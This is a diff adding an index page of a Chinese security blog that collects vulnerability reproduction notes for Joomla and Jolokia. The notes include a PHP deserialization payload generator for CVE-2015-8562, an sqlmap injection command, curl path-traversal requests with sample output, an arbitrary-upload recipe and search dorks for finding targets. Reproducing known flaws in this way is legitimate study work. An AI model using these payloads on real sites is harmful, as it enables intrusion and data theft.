@@ -1,0 +1,644 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/page/66/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main">
+  
+
+    
+    <article id="post-Joomla/（CVE-2016-8869）Joomla 3.4.4-3.6.3 未授权创建特权用户" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Joomla/%EF%BC%88CVE-2016-8869%EF%BC%89Joomla%203.4.4-3.6.3%20%E6%9C%AA%E6%8E%88%E6%9D%83%E5%88%9B%E5%BB%BA%E7%89%B9%E6%9D%83%E7%94%A8%E6%88%B7/" class="article-date">
+  <time datetime="2022-07-08T06:25:58.271Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2016-8869）Joomla-3-4-4-3-6-3-未授权创建特权用户"><a href="#（CVE-2016-8869）Joomla-3-4-4-3-6-3-未授权创建特权用户" class="headerlink" title="（CVE-2016-8869）Joomla 3.4.4-3.6.3 未授权创建特权用户"></a>（CVE-2016-8869）Joomla 3.4.4-3.6.3 未授权创建特权用户</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>网站关闭注册的情况下仍可创建用户，默认状态下用户需要用邮件激活，但需要开启注册功能才能激活。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Joomla 3.4.4-3.6.3</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><ul>
+<li>  首先在后台关闭注册功能，关闭后首页没有注册选项：</li>
+</ul>
+<p><img src="/resource/(CVE-2016-8869)Joomla3.4.4-3.6.3%E6%9C%AA%E6%8E%88%E6%9D%83%E5%88%9B%E5%BB%BA%E7%89%B9%E6%9D%83%E7%94%A8%E6%88%B7/media/rId24.png" alt="1.png"></p>
+<ul>
+<li>  .然后通过访问index.php抓包获取cookie，通过看index.php源码获取token：</li>
+</ul>
+<p><img src="/resource/(CVE-2016-8869)Joomla3.4.4-3.6.3%E6%9C%AA%E6%8E%88%E6%9D%83%E5%88%9B%E5%BB%BA%E7%89%B9%E6%9D%83%E7%94%A8%E6%88%B7/media/rId25.png" alt="2.png"></p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Joomla/%EF%BC%88CVE-2016-8869%EF%BC%89Joomla%203.4.4-3.6.3%20%E6%9C%AA%E6%8E%88%E6%9D%83%E5%88%9B%E5%BB%BA%E7%89%B9%E6%9D%83%E7%94%A8%E6%88%B7/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Joomla/%EF%BC%88CVE-2016-8869%EF%BC%89Joomla%203.4.4-3.6.3%20%E6%9C%AA%E6%8E%88%E6%9D%83%E5%88%9B%E5%BB%BA%E7%89%B9%E6%9D%83%E7%94%A8%E6%88%B7/" data-id="cl5c2qrl5009wy8v17cc4ha2r" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Joomla/（CVE-2015-8562）Joomla 3.4.5 反序列化漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Joomla/%EF%BC%88CVE-2015-8562%EF%BC%89Joomla%203.4.5%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:25:58.269Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2015-8562）Joomla-3-4-5-反序列化漏洞"><a href="#（CVE-2015-8562）Joomla-3-4-5-反序列化漏洞" class="headerlink" title="（CVE-2015-8562）Joomla 3.4.5 反序列化漏洞"></a>（CVE-2015-8562）Joomla 3.4.5 反序列化漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>本漏洞根源是PHP5.6.13前的版本在读取存储好的session时，如果反序列化出错则会跳过当前一段数据而去反序列化下一段数据。而Joomla将session存储在Mysql数据库中，编码是utf8，当我们插入4字节的utf8数据时则会导致截断。截断后的数据在反序列化时就会失败，最后触发反序列化漏洞。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><ul>
+<li>  Joomla 1.5.x, 2.x, and 3.x before 3.4.6</li>
+<li>  PHP 5.6 &lt; 5.6.13, PHP 5.5 &lt; 5.5.29 and PHP 5.4 &lt; 5.4.45</li>
+</ul>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>我们不带User-Agent头，先访问一次目标主页，记下服务端返回的Cookie：</p>
+<p><img src="/resource/(CVE-2015-8562)Joomla3.4.5%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId24.png"></p>
+<p>再用如下脚本生成POC：</p>
+<pre><code>&lt;?php
+class JSimplepieFactory &#123;
+&#125;
+class JDatabaseDriverMysql &#123;
+
+&#125;
+class SimplePie &#123;
+    var $sanitize;
+    var $cache;
+    var $cache_name_function;
+    var $javascript;
+    var $feed_url;
+    function __construct()
+    &#123;
+        $this-&gt;feed_url = &quot;phpinfo();JFactory::getConfig();exit;&quot;;
+        $this-&gt;javascript = 9999;
+        $this-&gt;cache_name_function = &quot;assert&quot;;
+        $this-&gt;sanitize = new JDatabaseDriverMysql();
+        $this-&gt;cache = true;
+    &#125;
+&#125;
+
+class JDatabaseDriverMysqli &#123;
+    protected $a;
+    protected $disconnectHandlers;
+    protected $connection;
+    function __construct()
+    &#123;
+        $this-&gt;a = new JSimplepieFactory();
+        $x = new SimplePie();
+        $this-&gt;connection = 1;
+        $this-&gt;disconnectHandlers = [
+            [$x, &quot;init&quot;],
+        ];
+    &#125;
+&#125;
+
+$a = new JDatabaseDriverMysqli();
+$poc = serialize($a); 
+
+$poc = str_replace(&quot;\x00*\x00&quot;, &#39;\\0\\0\\0&#39;, $poc);
+
+echo &quot;123&#125;__test|&#123;$poc&#125;\xF0\x9D\x8C\x86&quot;;
+</code></pre>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Joomla/%EF%BC%88CVE-2015-8562%EF%BC%89Joomla%203.4.5%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Joomla/%EF%BC%88CVE-2015-8562%EF%BC%89Joomla%203.4.5%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qrl4009uy8v1ee390e6x" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Joomla/Joomscan" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Joomla/Joomscan/" class="article-date">
+  <time datetime="2022-07-08T06:25:58.267Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="joomscan"><a href="#joomscan" class="headerlink" title="joomscan"></a>joomscan</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>joomscan</p>
+<h2 id="二、影响范围"><a href="#二、影响范围" class="headerlink" title="二、影响范围"></a>二、影响范围</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><pre><code>https://github.com/rezasp/joomsca
+</code></pre>
+
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Joomla/Joomscan/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Joomla/Joomscan/" data-id="cl5c2qrl4009vy8v17nimel6p" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Joomla/Joomla! com_hdwplayer 4.2 - &#39;search.php&#39; sql注入" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Joomla/Joomla!%20com_hdwplayer%204.2%20-%20'search.php'%20sql%E6%B3%A8%E5%85%A5/" class="article-date">
+  <time datetime="2022-07-08T06:25:58.264Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Joomla-com-hdwplayer-4-2-39-search-php-39-sql注入"><a href="#Joomla-com-hdwplayer-4-2-39-search-php-39-sql注入" class="headerlink" title="Joomla com_hdwplayer 4.2 - &#39;search.php&#39; sql注入"></a>Joomla com_hdwplayer 4.2 - &#39;search.php&#39; sql注入</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>关键字:inurl:&quot;index.php?option=com_hdwplayer&quot;</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>com_hdwplayer 4.2</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><pre><code>python ./sqlmap.py -u &quot;http://127.0.0.1/joomla/index.php&quot; --method=POST --random-agent --data &quot;option=com_hdwplayer&amp;view=search&amp;hdwplayersearch=xxx&quot; --level=5 --risk=3 --dbms=mysql -p hdwplayersearch
+</code></pre>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/48242">https://www.exploit-db.com/exploits/48242</a></p>
+</blockquote>
+
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Joomla/Joomla!%20com_hdwplayer%204.2%20-%20'search.php'%20sql%E6%B3%A8%E5%85%A5/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Joomla/Joomla!%20com_hdwplayer%204.2%20-%20'search.php'%20sql%E6%B3%A8%E5%85%A5/" data-id="cl5c2qrl3009ty8v1g7br7wbx" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Joomla/Joomla! com_fabrik 3.9.11 目录遍历漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Joomla/Joomla!%20com_fabrik%203.9.11%20%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:25:58.262Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Joomla-com-fabrik-3-9-11-目录遍历漏洞"><a href="#Joomla-com-fabrik-3-9-11-目录遍历漏洞" class="headerlink" title="Joomla! com_fabrik 3.9.11 目录遍历漏洞"></a>Joomla! com_fabrik 3.9.11 目录遍历漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>关键字:inurl:&quot;index.php?option=com_fabrik&quot;</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Version: 3.9</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><pre><code>$&gt; curl -X GET -i &quot;http://www.0-sec.org/joomla/index.php?option=com_fabrik&amp;task=plugin.pluginAjax&amp;plugin=image&amp;g=element&amp;method=onAjax_files&amp;folder=../../../../../../../../../../../../../../../tmp/&quot;
+...snip...
+[&#123;&quot;value&quot;:&quot;eila.jpg&quot;,&quot;text&quot;:&quot;eila.jpg&quot;,&quot;disable&quot;:false&#125;,&#123;&quot;value&quot;:&quot;eilanya.jpg&quot;,&quot;text&quot;:&quot;eilanya.jpg&quot;,&quot;disable&quot;:false&#125;,&#123;&quot;value&quot;:&quot;topsecret.png&quot;,&quot;text&quot;:&quot;topsecret.png&quot;,&quot;disable&quot;:false&#125;]
+...snip...
+$&gt; curl -X GET -i &quot;http://www.0-sec.org/joomla/index.php?option=com_fabrik&amp;task=plugin.pluginAjax&amp;plugin=image&amp;g=element&amp;method=onAjax_files&amp;folder=../../../../../../../../../../../../../../../home/user123/Pictures/&quot;
+...snip...
+[&#123;&quot;value&quot;:&quot;Revision2017_Banner.jpg&quot;,&quot;text&quot;:&quot;Revision2017_Banner.jpg&quot;,&quot;disable&quot;:false&#125;,&#123;&quot;value&quot;:&quot;Screenshot from 2019-02-23 22-43-54.png&quot;,&quot;text&quot;:&quot;Screenshot from 2019-02-23 22-43-54.png&quot;,&quot;disable&quot;:false&#125;,&#123;&quot;value&quot;:&quot;Screenshot from 2019-03-09 14-59-22.png&quot;,&quot;text&quot;:&quot;Screenshot from 2019-03-09 14-59-22.png&quot;,&quot;disable&quot;:false&#125;,&#123;&quot;value&quot;:&quot;Screenshot from 2019-03-09 14-59-25.png&quot;,&quot;text&quot;:&quot;Screenshot from 2019-03-09 14-59-25.png&quot;,&quot;disable&quot;:false&#125;,&#123;&quot;value&quot;:&quot;Screenshot from 2019-03-16 23-17-05.png&quot;,&quot;text&quot;:&quot;Screenshot from 2019-03-16 23-17-05.png&quot;,&quot;disable&quot;:false&#125;,&#123;&quot;value&quot;:&quot;Screenshot from 2019-03-18 07-30-41.png&quot;,&quot;text&quot;:&quot;Screenshot from 2019-03-18 07-30-41.png&quot;,&quot;disable&quot;:false&#125;,&#123;&quot;value&quot;:&quot;Screenshot from 2019-03-18 08-23-45.png&quot;,&quot;text&quot;:&quot;Screenshot from 2019-03-18 08-23-45.png&quot;,&quot;disable&quot;:false&#125;,&#123;&quot;value&quot;:&quot;Screenshot from 2019-04-08 00-09-36.png&quot;,&quot;text&quot;:&quot;Screenshot from 2019-04-08 00-09-36.png&quot;,&quot;disable&quot;:false&#125;,&#123;&quot;value&quot;:&quot;Screenshot from 2019-04-08 10-34-23.png&quot;,&quot;text&quot;:&quot;Screenshot from 2019-04-08 10-34-23.png&quot;,&quot;disable&quot;:false&#125;,&#123;&quot;value&quot;:&quot;Screenshot from 2019-04-13 08-23-48.png&quot;,&quot;text&quot;:&quot;Screenshot from 2019-04-13 08-23-48.png&quot;,&quot;disable&quot;:false&#125;,&#123;&quot;value&quot;:&quot;Screenshot from 2019-05-24 23-14-05.png&quot;,&quot;text&quot;:&quot;Screenshot from 2019-05-24 23-14-05.png&quot;,&quot;disable&quot;:false&#125;,&#123;&quot;value&quot;:&quot;b.jpg&quot;,&quot;text&quot;:&quot;b.jpg&quot;,&quot;disable&quot;:false&#125;,&#123;&quot;value&quot;:&quot;by_gh0uli.tumblr.com-8755.png.jpeg&quot;,&quot;text&quot;:&quot;by_gh0uli.tumblr.com-8755.png.jpeg&quot;,&quot;disable&quot;:false&#125;,&#123;&quot;value&quot;:&quot;max_payne_06.jpg&quot;,&quot;text&quot;:&quot;max_payne_06.jpg&quot;,&quot;disable&quot;:false&#125;,&#123;&quot;value&quot;:&quot;xxx.jpg&quot;,&quot;text&quot;:&quot;xxx.jpg&quot;,&quot;disable&quot;:false&#125;]
+...snip...
+</code></pre>
+
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Joomla/Joomla!%20com_fabrik%203.9.11%20%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Joomla/Joomla!%20com_fabrik%203.9.11%20%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qrl3009ry8v1at8n2t1y" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Joomla/Joomla! component GMapFP 3.30 任意文件上传" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Joomla/Joomla!%20component%20GMapFP%203.30%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="article-date">
+  <time datetime="2022-07-08T06:25:58.260Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Joomla-component-GMapFP-3-30-任意文件上传"><a href="#Joomla-component-GMapFP-3-30-任意文件上传" class="headerlink" title="Joomla component GMapFP 3.30 任意文件上传"></a>Joomla component GMapFP 3.30 任意文件上传</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>关键字:inurl:&#39;&#39;com_gmapfp&#39;&#39;</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Joomla Gmapfp Components 3.x</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><pre><code>http://www.0-sec.org/index.php?option=comgmapfp&amp;controller=editlieux&amp;tmpl=component&amp;task=upload_image
+file.php.png , file2.php.jpeg , file3.html.jpg ,file3.txt.jpg
+</code></pre>
+<p>目录文件路径</p>
+<pre><code>http://www.0-sec.org/images/gmapfp/file.php
+http://www.0-sec.org/images/gmapfp/file.php.png
+</code></pre>
+
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Joomla/Joomla!%20component%20GMapFP%203.30%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Joomla/Joomla!%20component%20GMapFP%203.30%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" data-id="cl5c2qrl3009sy8v1285228u4" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Joomla/Joomla 3.4.6 - &#39;configuration.php&#39; Remote Code Execution" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Joomla/Joomla%203.4.6%20-%20'configuration.php'%20Remote%20Code%20Execution/" class="article-date">
+  <time datetime="2022-07-08T06:25:58.257Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Joomla-3-4-6-configuration-php-远程代码执行"><a href="#Joomla-3-4-6-configuration-php-远程代码执行" class="headerlink" title="Joomla 3.4.6 configuration.php 远程代码执行"></a>Joomla 3.4.6 configuration.php 远程代码执行</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>Joomla 3.4.6 - &#39;configuration.php&#39; Remote Code Execution</p>
+<h2 id="二、影响范围"><a href="#二、影响范围" class="headerlink" title="二、影响范围"></a>二、影响范围</h2><p>Joomla 3.0.0 至 3.4.6</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p><a target="_blank" rel="noopener" href="https://github.com/ianxtianxt/Joomla-3.4.6/-/--configuration.php-Remote-Code-Execution">https://github.com/ianxtianxt/Joomla-3.4.6\-\--configuration.php-Remote-Code-Execution</a></p>
+<h3 id="脚本验证"><a href="#脚本验证" class="headerlink" title="脚本验证"></a>脚本验证</h3><p>验证：</p>
+<pre><code>python3 test.py -t http://127.0.0.1:8080/
+</code></pre>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Joomla/Joomla%203.4.6%20-%20'configuration.php'%20Remote%20Code%20Execution/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Joomla/Joomla%203.4.6%20-%20'configuration.php'%20Remote%20Code%20Execution/" data-id="cl5c2qrl2009qy8v114nkgcxd" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Joomla/Joomla 3-3.4.6 远程命令执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Joomla/Joomla%203-3.4.6%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:25:58.254Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Joomla-3-4-6-39-configuration-php-39-远程代码执行"><a href="#Joomla-3-4-6-39-configuration-php-39-远程代码执行" class="headerlink" title="Joomla 3.4.6 - &#39;configuration.php&#39; 远程代码执行"></a>Joomla 3.4.6 - &#39;configuration.php&#39; 远程代码执行</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>Joomla 3.4.6 - &#39;configuration.php&#39; Remote Code Execution</p>
+<h2 id="二、影响范围"><a href="#二、影响范围" class="headerlink" title="二、影响范围"></a>二、影响范围</h2><p>Joomla 3.0.0 至 3.4.6</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p><a target="_blank" rel="noopener" href="https://github.com/ianxtianxt/Joomla-3.4.6---configuration.php-Remote-Code-Execution">https://github.com/ianxtianxt/Joomla-3.4.6---configuration.php-Remote-Code-Execution</a></p>
+<h3 id="脚本验证"><a href="#脚本验证" class="headerlink" title="脚本验证"></a>脚本验证</h3><p>验证：</p>
+<pre><code>python3 test.py -t http://127.0.0.1:8080/
+</code></pre>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Joomla/Joomla%203-3.4.6%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Joomla/Joomla%203-3.4.6%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qrk2009ny8v10fsu96kx" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Jolokia/（CVE-2018-1000130）Jolokia 远程代码执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Jolokia/%EF%BC%88CVE-2018-1000130%EF%BC%89Jolokia%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:25:58.235Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2018-1000130）Jolokia-远程代码执行漏洞"><a href="#（CVE-2018-1000130）Jolokia-远程代码执行漏洞" class="headerlink" title="（CVE-2018-1000130）Jolokia 远程代码执行漏洞"></a>（CVE-2018-1000130）Jolokia 远程代码执行漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>Jolokia服务的代理模式默认情况下在1.5.0版之前容易受到<strong>JNDI注入</strong>的攻击。当以代理模式部署Jolokia代理时，有权访问Jolokia<br>Web端点的外部攻击者可以通过JNDI注入攻击远程执行任意代码。由于Jolokia库使用用户提供的输入启动LDAP<br>/ RMI连接，因此有可能造成这种攻击。</p>
+<h4 id="利用条件："><a href="#利用条件：" class="headerlink" title="利用条件："></a>利用条件：</h4><ul>
+<li>  目标网站存在 <code>/jolokia</code> 或 <code>/actuator/jolokia</code> 接口</li>
+<li>目标使用了 <code>jolokia-core</code> 依赖（版本要求暂未知）并且环境中存在相关<br>  MBean</li>
+<li>  目标可以请求攻击者的服务器（请求可出外网）</li>
+<li>  实际测试 RMI 注入受目标 JDK 版本影响，jdk &lt; 6u141/7u131/8u121</li>
+</ul>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Jolokia &lt; 1.50</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><ol>
+<li> 利用 jolokia 调用 createJNDIRealm 创建 JNDIRealm</li>
+<li> 设置 connectionURL 地址为 RMI Service URL</li>
+<li> 设置 contextFactory 为 RegistryContextFactory</li>
+<li> 停止 Realm</li>
+<li> 启动 Realm 以触发指定 RMI 地址的 JNDI 注入，造成 RCE 漏洞</li>
+</ol>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Jolokia/%EF%BC%88CVE-2018-1000130%EF%BC%89Jolokia%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Jolokia/%EF%BC%88CVE-2018-1000130%EF%BC%89Jolokia%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qrjy009cy8v1f0hagiox" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
